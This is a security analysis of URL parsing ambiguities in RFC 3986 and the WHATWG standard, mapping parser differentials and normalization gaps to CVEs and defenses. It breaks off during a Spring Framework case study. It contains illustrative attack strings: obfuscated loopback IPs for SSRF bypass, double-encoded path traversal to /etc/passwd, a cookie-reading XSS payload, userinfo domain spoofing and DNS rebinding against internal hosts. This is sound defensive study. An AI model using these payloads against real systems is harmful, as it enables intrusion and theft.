# URL Specification Security Analysis: Direct Extraction from RFC/Spec Sources

> **Analysis Target**: RFC 3986 (URI Generic Syntax), WHATWG URL Living Standard
> **Methodology**: Direct spec source examination + Cross-analysis with latest CVE/attack cases
> **Coverage Period**: Includes CVEs and conference presentations from 2024-2025
> **Date**: 2026-02-08

---

## Table of Contents

- [Part 1: Meta-level Design Issues in URL Parsing](#part-1-meta-level-design-issues-in-url-parsing)
- [Part 2: Parser Differentials Between Implementations](#part-2-parser-differentials-between-implementations)
- [Part 3: Security Implications of Normalization and Comparison](#part-3-security-implications-of-normalization-and-comparison)
- [Part 4: Comprehensive CVE and Attack Case Studies](#part-4-comprehensive-cve-and-attack-case-studies)
- [Appendix: Attack-Spec-Defense Mapping Table](#appendix-attack-spec-defense-mapping-table)
- [Appendix: Security Validation Checklist](#appendix-security-validation-checklist)

---

## Part 1: Meta-level Design Issues in URL Parsing

### 1. Fundamental Differences Between RFC 3986 and WHATWG Specs (Spec Conflict)

**Spec Behavior**:
- **RFC 3986 §3**: *"Each URI begins with a scheme name that refers to a specification for assigning identifiers within that scheme."* - Scheme is a required component
- **WHATWG URL Standard §4.1**: The spec explicitly allows relative URLs without schemes and continues parsing after removing tab and newline characters

**Security Implications**:
Due to fundamental differences between the two specs, **the same URL string can be interpreted completely differently by different parsers**. Parsers following RFC 3986 should reject inputs that WHATWG-compliant parsers treat as valid.

**Attack Vectors**:
- **Scheme Confusion**: When `"google.com/abc"` is provided as input
  - Most RFC 3986 parsers: Determine that host is empty
  - Python urllib3: Parses host as `google.com`, path as `/abc`
  - When the security validation layer (RFC parser) and actual request layer (urllib3) make different judgments, **SSRF bypass** occurs

```python
# Attack scenario: SSRF filter bypass via double parsing
malicious_url = "attacker.com/redirect?to=http://internal.service"

# Stage 1: Security filter (RFC 3986 strict parser)
validator_parser.parse(malicious_url)  # host = "attacker.com" → Allow

# Stage 2: Actual request (urllib3, etc.)
actual_request(malicious_url)  # Follows redirect to access internal.service
```

**Real-World Cases**:
- **CVE-2024-22259, CVE-2024-22243, CVE-2024-22262** (Spring Framework): `UriComponentsBuilder` bypasses host validation when parsing externally-provided URLs, leading to SSRF/Open Redirect
- Snyk research (2024): Found 5 classes of inconsistencies among 16 URL parsers - scheme confusion, slashes confusion, backslash confusion, URL encoded data confusion, scheme mixup

**Spec-Based Defense**:
- RFC 3986 §7.6: *"Applications should not render as clear text any data after the first colon in userinfo"* - However, this only applies to userinfo and doesn't address scheme confusion
- **Practical Recommendation**: Use the same parser for both validation and execution. For Spring specifically, use `java.net.URI` or a verified single library instead of `UriComponentsBuilder`

---

### 2. Structural Vulnerabilities in Userinfo Field (RFC 3986 §7.5)

**Spec Behavior**:
- **RFC 3986 §3.2.1**: *"The userinfo subcomponent may consist of a user name and, optionally, scheme-specific information about how to gain authorization to access the resource."*
- **RFC 3986 §7.5**: *"Use of the format 'user:password' in the userinfo field is deprecated."* (However, still grammatically valid)

**Security Implications**:
RFC 3986 **recommends against but does not prohibit** the `user:password` format. This results in:
1. Many legacy parsers still supporting it
2. URLs being stored in plaintext in logs, browser history, and referrer headers
3. **Domain spoofing attacks** possible using the `@` character

**Attack Vectors**:

```
Attack Example 1: Domain Spoofing
https://trusted-bank.com:fakepass@evil.com/phishing
         └────────┬────────┘           └──┬──┘
              userinfo                 Actual host
```

Users see `trusted-bank.com` but are actually connected to `evil.com`.

```
Attack Example 2: Credential Exposure via Logs
https://user:S3cr3t!@internal-api.com/admin
→ Stored in plaintext in web server access.log, proxy logs, browser history
→ Direct credential exposure when logs are compromised
```

**Real-World Cases**:
- **WHATWG Browser Policy Changes (2019-2020)**: Chrome, Firefox, Safari all changed to completely remove or reject userinfo in URLs
- Node.js undici (#3220): Controversy over automatic credential removal following WHATWG URL standard

**Spec-Based Defense**:
- **WHATWG URL Standard §4.4**: *"There is no way to express a username or password within a valid URL string."* - Latest standard prohibits it entirely
- RFC 3986 §7.5 recommendation: *"Applications should not render as clear text any data after the first colon in userinfo"*
- **Practical Recommendations**:
  - Completely reject URLs containing userinfo fields
  - Use Authorization headers or standard authentication mechanisms like OAuth
  - Mask userinfo in URLs during log preprocessing

---

### 3. Duality of Percent-Encoding (RFC 3986 §2.1)

**Spec Behavior**:
- **RFC 3986 §2.1**: *"A percent-encoding mechanism is used to represent a data octet in a component when that octet's corresponding character is outside the allowed set or is being used as a delimiter of, or within, the component."*
- **RFC 3986 §6.2.2.2**: *"URI normalizers should decode percent-encoded octets that correspond to unreserved characters."*
- **Critical Rule**: *"Implementations MUST NOT percent-encode or decode the same string more than once."*

**Security Implications**:
While percent-encoding is a **mechanism to distinguish data from syntax**, the following issues exist:
1. **Non-compliance with the prohibition on repeated encoding**: Many implementations recursively decode, allowing attackers to bypass filters with multi-layer encoding
2. **Inconsistent normalization timing**: Different results depending on which layer performs decoding

**Attack Vectors**:

```
Attack Example 1: Exploiting Recursive Decoding
Input: %252e%252e%252f (i.e., ../ encoded twice)

1st decoding: %2e%2e%2f
2nd decoding: ../          ← Path traversal successful!

Spec-compliant parsers should decode only once,
but parsers that recursively decode behave as the attacker intends
```

```
Attack Example 2: Filter Bypass
WAF rule: Block "../"

Attacker input: /%2e%2e%2f
→ WAF: String matching fails → Pass
→ Backend: Interprets as ../ after decoding → Directory traversal
```

```
Attack Example 3: Host Validation Bypass (CVE-2024-22259 related)
https:google.com → Normalized → https://google.com
                                     ↑ Scheme delimiter auto-added
Some parsers auto-normalize, bypassing validation
```

**Real-World Cases**:
- **CVE-2021-41773** (Apache HTTP Server 2.4.49): Path normalization changes caused encoded path traversal characters like `%2e` to not be normalized, leading to authentication bypass and arbitrary file reading
- **Axios SSRF bypass (#7315)**: URL normalization automatically corrects `https:google.com` → `https://google.com`, bypassing SSRF filters
- **ChatGPT Account Takeover (2023)**: Full account takeover possible due to path normalization issues

**Spec-Based Defense**:
- **RFC 3986 §2.4 MUST rule**: *"Implementations MUST NOT percent-encode or decode the same string more than once"*
- **RFC 3986 §6.2.2.2**: Unreserved characters (`A-Za-z0-9-._~`) should not be encoded, and should be decoded when found
- **Practical Recommendations**:
  - Decode **exactly once** immediately upon receiving input
  - Complete normalization **before** security validation
  - Perform path traversal pattern checks **after** decoding
  - Explicitly prohibit recursive decoding

---

### 4. Ambiguity in Authority Component (RFC 3986 §3.2)

**Spec Behavior**:
- **RFC 3986 §3.2**: *"The authority component is preceded by a double slash ('//') and is terminated by the next slash ('/'), question mark ('?'), or number sign ('#') character, or by the end of the URI."*
- **Slash Rule**: Paths in URIs with authority must start with `/` or be empty

**Security Implications**:
Parsers interpret differently based on the number and position of slashes, and some parsers treat backslashes (`\`) as slashes. This causes **protocol confusion** and **redirect attacks**.

**Attack Vectors**:

```
Attack Example 1: Slash Count Confusion
Input: https:/evil.com (one slash)

RFC 3986 strict parser: Error (authority delimiter // incomplete)
Lenient parser: Interprets evil.com as host
→ SSRF filter bypass
```

```
Attack Example 2: Backslash Confusion
Input: https:\\evil.com

Windows-based parser: Converts \ to / → Accesses evil.com
Unix-based parser: Treats \ as regular character → Different interpretation
→ Parser differential occurs
```

```
Attack Example 3: Orange Tsai's Confusion Attack (CVE-2024-38473)
In Apache HTTP Server, the filename field should be a filesystem path,
but some modules treat it as a URL
→ Force NTLM authentication with backslash → SSRF → NTLM Relay → RCE
```

**Real-World Cases**:
- **Orange Tsai, Black Hat USA 2024**: Presented 3 types of Confusion Attacks, 9 vulnerabilities, 20 exploitation techniques in Apache HTTP Server. Discovered CVE-2024-38473, CVE-2024-38476, CVE-2024-38477, etc.
- **SharePoint XXE (CVE-2024-30043)**: Exploited URL parsing confusion for XXE injection → File reading and SSRF with SharePoint Farm Service account privileges

**Spec-Based Defense**:
- **RFC 3986 §3.3**: *"If a URI contains an authority component, then the path component must either be empty or begin with a slash ('/') character."*
- **Practical Recommendations**:
  - Strictly validate slash count (exactly 2: `//`)
  - Do not automatically convert backslashes to slashes
  - Clearly distinguish between filesystem paths and URLs when using protocol-specific parsers

---

### 5. Legacy Support Issues in Host Parsing (RFC 3986 §7.4)

**Spec Behavior**:
- **RFC 3986 §7.4**: *"Some older implementations accept IPv4 addresses that omit the dots, or that use hexadecimal or octal values for octets."*
- **WHATWG URL Standard §4.3**: IPv4 parser supports octal (0 prefix) and hexadecimal (0x prefix) notation but marks these as "validation errors"

**Security Implications**:
Due to legacy compatibility, **various IP address notations** coexist, and security filters that don't recognize all of them can be bypassed.

**Attack Vectors**:

```
Attack Example: SSRF Filter Bypass via IP Address Obfuscation

Target: 127.0.0.1 (localhost) access

Method 1: Octal notation
http://0177.0.0.1  (0177 = 127)

Method 2: Hexadecimal notation
http://0x7f.0.0.1

Method 3: Integer conversion
http://2130706433  (127 * 256^3 + 0 * 256^2 + 0 * 256 + 1)

Method 4: Mixed
http://0177.0x00.0.01

WAF/Filter: "127.0.0.1" string matching fails → Pass
Actual parser: All interpreted as 127.0.0.1 → localhost access successful
```

**Real-World Cases**:
- **PortSwigger SSRF Labs**: Provides hands-on practice for SSRF bypass using IP obfuscation techniques
- Python urllib3: URL-encoded IP addresses (`http://127.%30.%30.1`) interpreted as `127.0.0.1`, causing unexpected requests

**Spec-Based Defense**:
- **RFC 3986 §7.4 recommendation**: *"All implementations should be prepared to accept both the traditional dotted-decimal notation and any of the alternative formats for IPv4 addresses."*
- **WHATWG approach**: Parse legacy formats but mark as validation errors
- **Practical Recommendations**:
  - Normalize all alternative IP address formats before validation
  - Use dedicated IP parsers (`inet_pton`, etc.) instead of regex matching
  - Check internal IP ranges based on normalized format

---

### 6. Client-Side Nature of Fragment Identifiers (RFC 3986 §3.5)

**Spec Behavior**:
- **RFC 3986 §3.5**: *"The fragment identifier component of a URI allows indirect identification of a secondary resource by reference to a primary resource and additional identifying information. The identified secondary resource may be some portion or subset of the primary resource, some view on representations of the primary resource, or some other resource defined or described by those representations."*
- **Critical**: *"Fragment identifiers are not used in the scheme-specific processing of a URI... they are not sent in the HTTP protocol."*

**Security Implications**:
Fragments are **not sent to the server** and are only processed client-side. This means:
1. Server-side logging/security validation cannot see fragments
2. XSS risk when client-side JavaScript does fragment-based routing
3. Sensitive information passed via fragments cannot be server-validated

**Attack Vectors**:

```
Attack Example 1: Fragment-Based XSS
URL: https://vulnerable.com/#<script>alert(document.cookie)</script>

Client-side router (React Router, etc.):
const hash = window.location.hash;
document.body.innerHTML = hash;  ← XSS occurs!

Server doesn't receive fragment, so WAF bypassed
```

```
Attack Example 2: OAuth Token Leak via Fragment
OAuth Implicit Flow:
https://app.com/callback#access_token=SECRET123

Referrer header: Fragment not transmitted (safe)
BUT JavaScript: All scripts can access location.hash
→ Malicious third-party scripts can steal tokens
```

```
Attack Example 3: Open Redirect Bypass
Server-side validation: Check redirect URL's host
Input: https://trusted.com#@evil.com

Server: host = "trusted.com" → Allow
Browser: Loads trusted.com, then client-side script
         parses #@evil.com → Changes location.href → Redirects to evil.com
```

**Real-World Cases**:
- **OAuth 2.0 Implicit Flow Deprecation**: Token passing via fragments vulnerable to XSS attacks, recommended to replace with Authorization Code Flow + PKCE
- **PortSwigger Research**: Published fragment-based Client-Side Template Injection attack patterns

**Spec-Based Defense**:
- **RFC 3986 §3.5**: Fragments not used in scheme-specific processing and not transmitted via HTTP protocol
- **OAuth 2.0 Security BCP**: Prohibit Implicit Flow use, prohibit passing sensitive information via fragments
- **Practical Recommendations**:
  - Strict validation and sanitization of inputs when doing fragment-based routing
  - Never include sensitive information (tokens, session IDs) in fragments
  - Strengthen CSP (Content Security Policy) to restrict inline scripts

---

## Part 2: Parser Differentials Between Implementations

### 7. Interpretation Differences in Scheme Requirement (RFC 3986 §3 vs WHATWG §4.1)

**Spec Behavior**:
- **RFC 3986 §3**: *"Each URI begins with a scheme name"* - Treats scheme as mandatory
- **RFC 2396 (earlier version)**: Allows scheme to be optional
- **WHATWG URL Standard**: Explicitly supports relative URLs

**Security Implications**:
Different implementations handle inputs without schemes differently:
- Reject as error
- Infer default scheme (http://)
- Interpret as relative URL

**Attack Vectors**:

```python
# Attack scenario: Differential Parsing
url = "//evil.com/payload"

# Parser A (RFC 3986 strict): No scheme → Error
# Parser B (lenient implementation): Infers http://evil.com/payload
# Parser C (relative URL): Interprets as relative path based on current page

if validate_with_parser_A(url):  # Error → Block
    pass
else:
    fetch_with_parser_B(url)      # Inference successful → SSRF
```

**Real-World Cases**:
- **Snyk research (2024)**: Most of 16 parsers interpret `//host/path` format differently
- Many inconsistencies found among Python urllib vs urllib3 vs requests

**Spec-Based Defense**:
- **RFC 3986 §4.2**: Explicitly defines relative references, but caution needed in security contexts
- **Practical Recommendations**:
  - External inputs should **only allow absolute URIs** (scheme required)
  - Use same parser for validation and execution
  - Allow relative URLs only in trusted contexts

---

### 8. Host Extraction Method Inconsistencies (`getHost()` Problem)

**Spec Behavior**:
- **RFC 3986 §3.2.2**: Host is one of IP-literal, IPv4address, reg-name
- **Java `java.net.URL.getHost()`**: Extracts host portion from URL
- **Python `urllib.parse.urlparse()`**: Returns 6-tuple (scheme, netloc, path, params, query, fragment)

**Security Implications**:
Each language/library's host extraction method returns **different results in edge cases**:
- Userinfo handling
- Port number inclusion
- Special character processing

**Attack Vectors**:

```java
// Java URL Confusion (Orange Tsai, Black Hat 2017)
String url = "http://example.com@evil.com/";

// Parser A (some Java implementations):
// getHost() → "evil.com"  ← Correct

// Parser B (legacy implementations):
// getHost() → "example.com@evil.com"  ← Wrong host

// Security validation
if (url.getHost().equals("example.com")) {  // Fails (legacy) or succeeds (normal)
    makeRequest(url);  // Sends request to evil.com
}
```

```python
# Python URL Encoding Confusion
from urllib.parse import urlparse

url = "http://127.%30.%30.1/"  # %30 = '0'

parsed = urlparse(url)
# Different interpretations by different parsers:
# - urllib: netloc = "127.%30.%30.1" (encoding preserved)
# - requests: Decodes to 127.0.0.1 during actual request
```

**Real-World Cases**:
- **Spring Framework CVE-2024-22259**: SSRF occurs due to host interpretation differences between `UriComponentsBuilder.fromUriString()` and actual HTTP client
- **Log4j RCE (CVE-2021-44228)**: Remote code execution exploiting JNDI URL parsing differences

**Spec-Based Defense**:
- **RFC 3986 §3.2.2**: Host is either IP-literal enclosed in `[` or `]`, IPv4 address, or registered name
- **Practical Recommendations**:
  - Don't trust language standard library methods like `getHost()`
  - Use explicit parsing libraries based on RFC 3986
  - Re-validate after converting host to IP address
  - Allow-list based validation (deny-lists are bypassable)

---

### 9. URL Encoding Processing Inconsistencies (RFC 3986 §2.1)

**Spec Behavior**:
- **RFC 3986 §2.1**: *"A percent-encoded octet is encoded as a character triplet, consisting of the percent character '%' followed by the two hexadecimal digits representing that octet's numeric value."*
- **RFC 3986 §2.4**: Defines unreserved character set

**Security Implications**:
Different implementations vary in URL decoding timing and frequency:
1. **Decoding timing**: Before vs after input validation
2. **Recursive decoding**: Once vs repeatedly
3. **Case sensitivity**: `%2E` vs `%2e` handling

**Attack Vectors**:

```
Attack Example: Recursive Decoding Differences
Input: http://example.com/%252e%252e%252f

Parser A (decode once):
→ http://example.com/%2e%2e%2f
→ Security validation: No "../" pattern → Pass

Parser B (recursive decoding):
→ http://example.com/../
→ Actual request: Directory traversal successful
```

```
Attack Example: SSRF Filter Bypass
WAF rule: Block "127.0.0.1"

Input: http://127.%30.%30.1/admin

WAF: String matching fails → Pass
urllib3/requests: Decodes to 127.0.0.1 → localhost access
```

**Real-World Cases**:
- **Python urllib URL Encoding Confusion**: urllib and requests decode URL-encoded hosts, causing unexpected 127.0.0.1 access
- **Axios normalization issue (#7315)**: Auto-corrects `https:google.com` to `https://google.com`, bypassing SSRF filters

**Spec-Based Defense**:
- **RFC 3986 §2.4 MUST**: *"Implementations MUST NOT percent-encode or decode the same string more than once"*
- **Practical Recommendations**:
  - Decode **exactly once** immediately upon receiving input (prohibit recursion)
  - Perform normalization after decoding
  - Perform security validation after normalization
  - Use only validated, normalized URLs

---

### 10. Backslash and Slash Confusion (WHATWG vs RFC 3986)

**Spec Behavior**:
- **RFC 3986**: Doesn't specifically handle backslash (`\`) (treated as regular character)
- **WHATWG URL Standard**: Normalizes backslashes to slashes for certain schemes (http, https, etc.)

**Security Implications**:
Windows-based systems and Unix-based systems handle backslashes differently, and some browsers automatically convert backslashes to slashes.

**Attack Vectors**:

```
Attack Example 1: Protocol Confusion
Input: http:\\evil.com\path

Windows/WHATWG parser: Converts \ to /
→ http://evil.com/path

Unix strict parser: \ is regular character
→ Parses host portion differently

Security filter (Unix): host = ???
Actual request (Windows): host = evil.com
```

```
Attack Example 2: Apache Confusion Attack (CVE-2024-38473)
Some Apache modules treat filename field as URL
Using backslashes:
→ Escape DocumentRoot
→ Force NTLM authentication (UNC path)
→ SSRF → NTLM Relay → RCE
```

**Real-World Cases**:
- **Orange Tsai, Black Hat USA 2024**: Presented various attack vectors exploiting backslash confusion in Apache HTTP Server
- **CVE-2024-38473, CVE-2024-38476**: Patched in Apache 2.4.60

**Spec-Based Defense**:
- **WHATWG**: Normalizes backslashes to slashes for certain schemes (explicit definition)
- **Practical Recommendations**:
  - Reject URLs containing backslashes or establish explicit normalization policy
  - Clearly distinguish between filesystem paths and URLs
  - Ensure cross-platform consistency (use same parser)

---

### 11. Tab and Newline Character Processing Inconsistencies (WHATWG §4.1)

**Spec Behavior**:
- **WHATWG URL Standard §4.1**: *"The URL parser removes all leading and trailing C0 controls and space from the input string. It also removes all tab and newline characters from the input string."*
- **RFC 3986**: Doesn't explicitly handle tabs and newlines (percent-encoding required)

**Security Implications**:
WHATWG parsers automatically **remove** tabs (`\t`) and newlines (`\n`, `\r`) to continue parsing, while RFC 3986 strict parsers may treat these as errors.

**Attack Vectors**:

```
Attack Example: Filter Bypass via Tab/Newline Injection
Input: http://tru\nsted.com@evil.com/

Security filter (string matching):
→ Finds "trusted.com" → Allow

WHATWG parser (browser):
→ Removes \n → http://trusted.com@evil.com/
→ userinfo = "trusted.com", host = "evil.com"
→ Accesses evil.com
```

```
Attack Example: HTTP Request Smuggling Linkage
GET /path HTTP/1.1\r\n
Host: trusted.com@evil.com\r\n\r\n

Some parsers: Parse Host header as-is
WHATWG-compatible parser: Recognizes only @evil.com as host
→ Request smuggling or cache poisoning
```

**Real-World Cases**:
- **PortSwigger Research, Black Hat 2024**: Presented Cache Key Confusion attacks exploiting tab/newline removal
- Reproducible with default configuration in Nginx behind Cloudflare, Apache behind CloudFront

**Spec-Based Defense**:
- **WHATWG explicit rule**: Remove C0 control characters and spaces
- **Practical Recommendations**:
  - **Immediately reject** when tab/newline characters found in input URLs (prohibit auto-removal)
  - Ensure consistency between HTTP header parsing and URL parsing
  - Be cautious with `\s` (whitespace character class) in regex matching

---

## Part 3: Security Implications of Normalization and Comparison

### 12. Scope of Case Normalization (RFC 3986 §6.2.2.1)

**Spec Behavior**:
- **RFC 3986 §6.2.2.1**: *"The scheme and host are case-insensitive and therefore should be normalized to lowercase. For example, the URI 'HTTP://www.EXAMPLE.com/' is equivalent to 'http://www.example.com/'."*
- **Path is case-sensitive**: Path component is case-sensitive

**Security Implications**:
Incorrect application of normalization scope leads to security validation bypass:
1. Only scheme/host should be converted to lowercase
2. Path should be preserved as-is

**Attack Vectors**:

```
Attack Example 1: Path Traversal Using Case Differences
Security rule: Block "/admin" path

Input: http://example.com/Admin
→ Case-insensitive filter: Pass
→ Case-sensitive server: /Admin != /admin → Access allowed

Or vice versa:
Input: http://example.com/admin
→ Case-sensitive filter: Block
→ Case-insensitive server (Windows IIS): /admin == /Admin → Access
```

```
Attack Example 2: Linkage with IDN Homograph Attack
Input: http://EXАMPLE.com/  (Cyrillic А)

After lowercase conversion: http://exаmple.com/
→ Domain spoofing when used with Unicode normalization
```

**Real-World Cases**:
- **IIS vs Apache Case Handling Differences**: Windows IIS doesn't distinguish path case, but Apache/Nginx does, causing parser differential
- Many WAFs convert paths to lowercase for checking, but actual servers distinguish case, enabling bypass

**Spec-Based Defense**:
- **RFC 3986 §6.2.2.1**: Normalize case only for scheme and host
- **Practical Recommendations**:
  - Align security validation with server's case handling
  - Windows servers: Convert paths to lowercase for validation too
  - Unix servers: Validate case as-is
  - Convert to Punycode before validation when using IDN (Internationalized Domain Name)

---

### 13. Percent-Encoding Normalization (RFC 3986 §6.2.2.2)

**Spec Behavior**:
- **RFC 3986 §6.2.2.2**: *"URIs that differ in the replacement of an unreserved character with its corresponding percent-encoded US-ASCII octet are equivalent."*
- **Unreserved characters**: `A-Z a-z 0-9 - . _ ~`
- **Normalization rule**: Encoding of unreserved characters should be decoded

**Security Implications**:
Treating non-normalized and normalized URLs as different entities leads to:
1. Duplicate cache entries
2. Security policy bypass
3. Access control inconsistencies for the same resource

**Attack Vectors**:

```
Attack Example 1: Cache Key Confusion
Original: http://example.com/api/users
Variant: http://example.com/api/%75sers  (%75 = 'u')

CDN cache: Treated as different keys → Duplicate cache
→ When cache poisoning, only normalized version poisoned
→ Users accessing non-normalized URL served poisoned cache
```

```
Attack Example 2: Access Control Bypass
ACL rule: Block "/admin"

Input: /%61dmin  (%61 = 'a')
→ ACL: String matching fails → Pass
→ Server: Processes as /admin after decoding → Access successful
```

```
Attack Example 3: Duplicate Resource Creation
POST /api/users HTTP/1.1
{"id": "user1"}

POST /api/%75sers HTTP/1.1
{"id": "user1"}

Non-normalizing API: Treated as different endpoints → Duplicate creation or logic errors
```

**Real-World Cases**:
- **PortSwigger Black Hat 2024**: Demonstrated XSS and confidential information disclosure on Nginx/Cloudflare, Apache/CloudFront using Cache Key Confusion
- **CVE-2021-41773** (Apache): Percent-encoded path traversal characters not normalized, leading to authentication bypass

**Spec-Based Defense**:
- **RFC 3986 §6.2.2.2**: Unreserved characters should be decoded
- **RFC 3986 §6.2.2**: *"For consistency, URI producers and normalizers should use uppercase hexadecimal digits for all percent-encodings."*
- **Practical Recommendations**:
  - Normalize immediately upon receiving input (decode unreserved)
  - Enforce uppercase hex digits (%2E, not %2e)
  - Use normalized form for cache keys, ACL checks, database storage
  - Unify various representations of the same URL to canonical form

---

### 14. Path Segment Normalization (RFC 3986 §6.2.2.3)

**Spec Behavior**:
- **RFC 3986 §6.2.2.3**: *"The '..' and '.' segments are removed from a URL path by applying the 'remove_dot_segments' algorithm."*
- **Algorithm**:
  - `.` is current directory (remove)
  - `..` is parent directory (remove previous segment)

**Security Implications**:
Core mechanism of path traversal attacks. Security outcomes vary based on normalization timing and method.

**Attack Vectors**:

```
Attack Example 1: Basic Path Traversal
Input: /api/../../../etc/passwd

Validation before normalization: "../" pattern found → Block
Validation after normalization: /etc/passwd → Allow or block

Sending request before normalization: /api/../../../etc/passwd → Server normalizes → /etc/passwd access
```

```
Attack Example 2: Encoding Linkage
Input: /api/%2e%2e/%2e%2e/etc/passwd

Normalization Order 1 (Wrong):
1. Path normalization: "/api/%2e%2e/%2e%2e/etc/passwd" (no change)
2. Percent-decode: "/api/../../etc/passwd"
3. Path traversal successful

Normalization Order 2 (Correct):
1. Percent-decode: "/api/../../etc/passwd"
2. Path normalization: "/etc/passwd"
3. Security validation: Outside DocumentRoot → Block
```

```
Attack Example 3: Path Normalization Bypass (CVE-2021-41773)
Apache 2.4.49 path normalization change:

Input: /.%2e/etc/passwd

Previous version: Normalized → /../etc/passwd → /etc/passwd
2.4.49: Doesn't normalize /.%2e/ → Passes as-is → Path traversal successful
```

**Real-World Cases**:
- **CVE-2021-41773, CVE-2021-42013** (Apache 2.4.49, 2.4.50): Path traversal vulnerability due to path normalization logic changes
- **Nginx proxy_pass URL Normalization Risk**: Unintended path access with configurations like `proxy_pass http://backend/..;`

**Spec-Based Defense**:
- **RFC 3986 §6.2.2.3**: Defines `remove_dot_segments` algorithm
  ```
  1. Read path from input buffer
  2. Remove "../" or "./" prefixes
  3. "/./" → "/"
  4. "/../" → "/" (also remove previous segment)
  5. Repeat
  ```
- **Practical Recommendations**:
  - Strictly follow **Decode → Normalize → Validate** order
  - Verify that absolute path after normalization is inside DocumentRoot
  - Consider symlinks (use `realpath()`)
  - Perform `../` pattern checks after decoding + normalization

---

### 15. Default Port Omission Normalization (RFC 3986 §6.2.3)

**Spec Behavior**:
- **RFC 3986 §6.2.3**: *"The default port for a given scheme may be omitted from the authority component, as described in Section 3.2.3."*
- Example: `http://example.com:80/` ≡ `http://example.com/`

**Security Implications**:
Different representations of the same resource created due to port number inclusion/omission, enabling security policy bypass if not handled consistently.

**Attack Vectors**:

```
Attack Example 1: Allow-list Bypass
Allow-list: "https://trusted.com/"

Input: https://trusted.com:443/redirect?to=evil.com

Validation: String matching fails (includes port number) → Block
BUT after normalization: https://trusted.com/redirect?to=evil.com
→ Same resource but policy inconsistency
```

```
Attack Example 2: CORS Policy Bypass
CORS Allow-Origin: https://app.example.com

Request: Origin: https://app.example.com:443
→ Browser: Judges match by normalizing
→ Server: Judges mismatch by string matching
→ CORS policy inconsistency
```

```
Attack Example 3: Cache Key Duplication
CDN cache key: Full URL

http://example.com/page
http://example.com:80/page
→ Different cache keys → Duplicate cache entries → Expanded impact range during cache poisoning attacks
```

**Real-World Cases**:
- Many CORS implementations don't handle port numbers consistently, leading to security policy bypass
- Numerous cache poisoning attack cases due to CDN cache key inconsistencies

**Spec-Based Defense**:
- **RFC 3986 §6.2.3**: Default port can be omitted, and omitted and explicit forms are equivalent
  - HTTP: 80
  - HTTPS: 443
  - FTP: 21
- **Practical Recommendations**:
  - Remove default ports when normalizing input URLs
  - Store allow-lists, CORS policies, etc. in normalized form
  - Use normalized URLs for cache keys

---

### 16. Trailing Dot in Domain (WHATWG vs RFC)

**Spec Behavior**:
- **RFC 3986**: No clear specification for trailing dot in hostnames
- **WHATWG URL Standard**: Treats `example.com` and `example.com.` as **different hosts**
- **DNS**: Trailing dot signifies fully-qualified domain name (FQDN)

**Security Implications**:
Trailing dot processing inconsistencies lead to:
1. Different representations of the same domain
2. Security policy bypass (CORS, CSP, cookie domain, etc.)

**Attack Vectors**:

```
Attack Example 1: CORS Bypass
CORS Allow-Origin: https://trusted.com

Request: Origin: https://trusted.com.
→ Some browsers/servers: Treat as same domain
→ WHATWG strict implementation: Different domains
→ Policy inconsistency
```

```
Attack Example 2: Cookie Isolation Bypass
Set-Cookie: session=secret; Domain=example.com

Request: https://example.com./
→ Browsers vary on whether to send cookie
→ Cookie isolation policy bypass or session hijacking
```

```
Attack Example 3: DNS Rebinding
attacker.com. → A record: 1.2.3.4 (attacker server)

Victim browser:
1. Access https://attacker.com. → 1.2.3.4
2. JavaScript: fetch('https://attacker.com./internal')
3. After DNS cache expires:
   attacker.com. → A record: 127.0.0.1
4. Access internal server
```

**Real-World Cases**:
- **WHATWG Explicit Blocking**: Treats trailing dots as different hosts to prevent confusion
- Some CDN/WAFs don't normalize trailing dots, enabling policy bypass

**Spec-Based Defense**:
- **WHATWG design decision**: `example.com` ≠ `example.com.` (explicit distinction)
- **DNS RFC**: Trailing dot is official notation for FQDN
- **Practical Recommendations**:
  - Remove or explicitly reject when trailing dot found
  - Base security policies like CORS, CSP, Cookie Domain on normalized domains
  - Normalize trailing dot before DNS query

---

### 17. Unicode Normalization and IDN (RFC 3987, WHATWG §3.3)

**Spec Behavior**:
- **RFC 3987 (IRI)**: Internationalized Resource Identifiers - Allows Unicode characters
- **WHATWG URL Standard §3.3**: Domain to ASCII conversion (Punycode)
- **Unicode normalization**: Various forms like NFC, NFD, NFKC, NFKD

**Security Implications**:
Unicode characters can be visually similar or become identical after normalization, creating **Homograph Attack** risks.

**Attack Vectors**:

```
Attack Example 1: IDN Homograph Attack
Attacker domain: exаmple.com (Cyrillic 'а' U+0430)
Legitimate domain: example.com (Latin 'a' U+0061)

Punycode: xn--exmple-7fd.com

User: Visually indistinguishable → Accesses phishing site
```

```
Attack Example 2: Unicode Normalization Exploitation (HostSplit/HostBond)
Certain Unicode characters normalize to empty string:
U+180E (Mongolian Vowel Separator)

Input: http://trusted\u180e.com@evil.com
Before normalization: trusted<U+180E>.com (userinfo)
After normalization: trusted.com (no userinfo)
→ Security filter bypass
```

```
Attack Example 3: Zero-Width Character Insertion
Input: http://trusted\u200B.com  (Zero-Width Space)

Some browsers: Normalize to trusted.com
Some filters: String matching fails → Block or allow inconsistency
```

**Real-World Cases**:
- **2017 Xudong Zheng**: `xn--80ak6aa92e.com` (Cyrillic spoofing `apple.com`) displayed indistinguishably in all major browsers
- **HostSplit/HostBond (Black Hat USA 2019)**: Presented domain masquerading techniques exploiting Unicode normalization

**Spec-Based Defense**:
- **RFC 3987 §3.2**: IRI requires percent-encoding when converting to URI
- **WHATWG §3.3**: Domain to ASCII (Punycode) conversion required
- **Practical Recommendations**:
  - Convert to Punycode form before validation when using IDN
  - Block mixed-script domains (mixing Latin + Cyrillic, etc.)
  - Browsers: Display in Punycode form (Chrome policy)
  - Remove zero-width, invisible characters

---

## Part 4: Comprehensive CVE and Attack Case Studies

### 18. Spring Framework URL Parsing Vulnerabilities (CVE-2024-22259, CVE-2024-22243, CVE-2024-22262)

**Vulnerability Description**:
When Spring Framework's `UriComponentsBuilder` parses externally-provided URLs and performs host validation, parsing differences between validation and actual HTTP requests lead to SSRF and Open Redirect.

**Affected Versions**:
- Spring Framework 6.1.0 ~ 6.1.4
- Spring Framework 6.0.0 ~ 6.0.17
- Spring Framework 5.3.0 ~ 5.3.32

**Attack Mechanism**:
```java
// Vulnerable code pattern
String userProvidedUrl = request.getParameter("url");

// Stage 1: Parse and validate with UriComponentsBuilder
UriComponents uri = UriComponentsBuilder.fromUriString(userProvidedUrl).build();
String host = uri.getHost();

if (allowedHosts.contains(host)) {  // Host validation
    // Stage 2: Actual HTTP request
    restTemplate.getForObject(userProvidedUrl, String.class);  // Uses different parser!
}
```

**Spec-Related Root Cause**:
- `UriComponentsBuilder` and actual HTTP clients (Apache HttpClient, OkHttp, etc.) use different parsing logic
